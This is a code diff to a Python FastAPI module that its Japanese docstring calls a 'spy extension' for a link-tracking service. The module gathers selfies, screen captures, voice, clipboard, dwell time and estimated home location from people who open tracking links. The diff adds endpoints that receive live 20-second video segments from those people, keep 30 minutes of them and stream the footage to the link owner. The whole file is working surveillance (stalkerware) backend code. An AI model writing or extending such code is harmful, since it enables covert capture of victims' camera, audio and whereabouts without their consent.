@@ -1,15 +1,15 @@
 """スパイ拡張：自撮り・リアルタイム映像/音声・クリップボード・滞在ログ・拠点推定・移動手段。
 
-v3:
-  ・cap の kind に "frame"（リアルタイム映像の1コマ）を追加
-  ・画面は /track/{code} に合流（/spy/{code} はリダイレクト）
+v4:
+  ・ライブ映像（20秒セグメント）の受け口 /s/{code}/vseg を追加
+  ・最大30分ぶんを保持。再生用に /s/{code}/video/*.webm と /s/{code}/vseg.json を追加
 """
 from __future__ import annotations
 
 import base64, datetime as dt, json, math, os, re, time
 
 from fastapi import APIRouter, Depends, HTTPException, Request
-from fastapi.responses import FileResponse, HTMLResponse, RedirectResponse
+from fastapi.responses import FileResponse, HTMLResponse, RedirectResponse, Response
 
 from . import linktrack, tenancy
 from .tenancy import db
@@ -21,6 +21,12 @@ CAP_KINDS = ("selfie", "screen", "voice", "frame")
 _EXT = {"image/jpeg": "jpg", "image/png": "png", "image/webp": "webp",
         "audio/webm": "webm", "audio/mp4": "m4a", "audio/ogg": "ogg",
         "audio/wav": "wav"}
+
+# ---- ライブ映像（セグメント）設定 ----
+VSEG_KEEP_SEC = int(float(os.getenv("VSEG_KEEP_MIN", "30") or 30) * 60)   # 保持する秒数
+VSEG_MAX_MB = float(os.getenv("VSEG_MAX_MB", "12") or 12)                # 1セグメント上限
+VSEG_MIME = {"webm": "video/webm", "mp4": "video/mp4",
+             "ogg": "video/ogg", "m4a": "video/mp4"}
 
 
 def _m():
@@ -150,6 +156,127 @@ async def ev(code: str, request: Request):
         if f:
             db.update_hit(hit, **f)
     return {"ok": True}
+
+
+# ---------- ライブ映像（20秒セグメント） ----------
+
+def _vdir(code):
+    d = os.path.join(_dir(code), "vseg")
+    os.makedirs(d, exist_ok=True)
+    return d
+
+
+def _vlist(code):
+    d = _vdir(code)
+    out = []
+    try:
+        for n in sorted(os.listdir(d)):
+            p = os.path.join(d, n)
+            if not os.path.isfile(p):
+                continue
+            if n.rsplit(".", 1)[-1] not in VSEG_MIME:
+                continue
+            st = os.stat(p)
+            out.append({"name": n, "path": p, "ts": st.st_mtime, "bytes": st.st_size})
+    except Exception:
+        pass
+    out.sort(key=lambda x: (x["ts"], x["name"]))
+    return out
+
+
+def _vprune(code):
+    files = _vlist(code)
+    if len(files) <= 2:
+        return
+    cut = time.time() - VSEG_KEEP_SEC
+    for f in files[:-1]:
+        if f["ts"] < cut:
+            try:
+                os.remove(f["path"])
+            except Exception:
+                pass
+
+
+def _vsend(code, files):
+    if not files:
+        raise HTTPException(404)
+    ext = files[0]["name"].rsplit(".", 1)[-1]
+    buf = b"".join(open(f["path"], "rb").read() for f in files)
+    return Response(buf, media_type=VSEG_MIME.get(ext, "video/webm"),
+                    headers={"Cache-Control": "no-store"})
+
+
+@router.post("/s/{code}/vseg")
+async def vseg(code: str, request: Request, sid: str = "", seq: int = 0,
+               ext: str = "webm", hit: int = 0):
+    if not _owner(code):
+        return {"ok": False}
+    raw = await request.body()
+    if not raw:
+        return {"ok": False, "why": "empty"}
+    if len(raw) > VSEG_MAX_MB * 1048576:
+        return {"ok": False, "why": "too big"}
+    sid = re.sub(r"[^a-zA-Z0-9_.-]", "", sid or "")[:40] or "s"
+    ext = ext if ext in VSEG_MIME else "webm"
+    name = f"{sid}_{int(seq):06d}.{ext}"
+    try:
+        with open(os.path.join(_vdir(code), name), "wb") as f:
+            f.write(raw)
+    except Exception as e:
+        return {"ok": False, "why": repr(e)}
+    with db.tx() as c:
+        c.execute("INSERT INTO link_events(code,hit_id,vid,kind,value,text,ts) "
+                  "VALUES(?,?,?,?,?,?,?)",
+                  (code, int(hit or 0), sid, "vseg", len(raw), name, _now()))
+    _vprune(code)
+    return {"ok": True, "file": name, "bytes": len(raw)}
+
+
+@router.get("/s/{code}/vseg.json")
+def vseg_list(code: str):
+    if not _owner(code):
+        raise HTTPException(404)
+    files = _vlist(code)
+    return {
+        "count": len(files), "keep_min": VSEG_KEEP_SEC // 60,
+        "files": [{
+            "name": f["name"], "bytes": f["bytes"],
+            "sid": f["name"].rsplit(".", 1)[0].rsplit("_", 1)[0],
+            "ts": dt.datetime.fromtimestamp(f["ts"], dt.timezone.utc).isoformat(),
+            "url": f"/s/{code}/vseg/{f['name']}",
+            "mime": VSEG_MIME.get(f["name"].rsplit(".", 1)[-1], "video/webm"),
+        } for f in files],
+    }
+
+
+@router.get("/s/{code}/vseg/{name}")
+def vseg_file(code: str, name: str):
+    if not _owner(code):
+        raise HTTPException(404)
+    safe = os.path.basename(name)
+    p = os.path.join(_vdir(code), safe)
+    if not os.path.exists(p):
+        raise HTTPException(404)
+    ext = safe.rsplit(".", 1)[-1]
+    return FileResponse(p, media_type=VSEG_MIME.get(ext, "video/webm"),
+                        headers={"Cache-Control": "no-store"})
+
+
+@router.get("/s/{code}/video/last.webm")
+def video_last(code: str):
+    """いちばん新しい1本（≒20秒）。リアルタイム表示用。"""
+    if not _owner(code):
+        raise HTTPException(404)
+    files = _vlist(code)
+    return _vsend(code, files[-1:] if files else [])
+
+
+@router.get("/s/{code}/video/all.webm")
+def video_all(code: str):
+    """保持しているぶんを連結（最大30分）。"""
+    if not _owner(code):
+        raise HTTPException(404)
+    return _vsend(code, _vlist(code))
 
 
 @router.get("/s/{code}/cap/{cid}")
@@ -311,6 +438,10 @@ def _insight(code):
         "ip_only": ip_only, "mobile_points": mob, "warn": warn,
         "dwell_ms": int(dwell["s"] or 0), "dwell_n": int(dwell["n"] or 0),
         "max_scroll": float(dwell["m"] or 0),
+        "video": [{"name": f["name"], "ts": dt.datetime.fromtimestamp(
+            f["ts"], dt.timezone.utc).isoformat(), "bytes": f["bytes"]}
+            for f in _vlist(code)],
+        "video_keep_min": VSEG_KEEP_SEC // 60,
     }
 
 
@@ -323,7 +454,6 @@ def api_spy(code: str):
 
 @router.get("/spy/{code}")
 def spy_page(code: str, request: Request, u=Depends(auth)):
-    """監視室は /track/{code} に統合したので、そちらへ送る。"""
     if not _owner(code):
         raise HTTPException(404)
     if not db.link_get(code):
